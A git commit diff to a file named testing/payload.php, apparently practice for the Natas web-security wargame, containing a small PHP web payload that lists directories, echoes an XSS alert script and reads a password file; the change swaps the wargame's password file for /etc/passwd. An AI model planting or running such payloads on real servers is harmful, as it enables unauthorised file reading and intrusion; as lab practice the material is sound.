cd9cb06b277a3efb7cbbbd62c3743ffbc16fa52f
NikNitro <adrimlg92@gmail.com>
2020-04-11 16:32:57 -0400

    Update payload.php

--- testing/payload.php
+++ testing/payload.php
@@ -2,4 +2,4 @@
 <?php echo 'scandir("/var/");'; ?> 
 <p><?php scandir('/home/'); ?> </p>
 <?php echo '<script>alert("XSS");</script>'; ?> 
-<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>
+<?php echo file_get_contents('/etc/passwd'); ?>
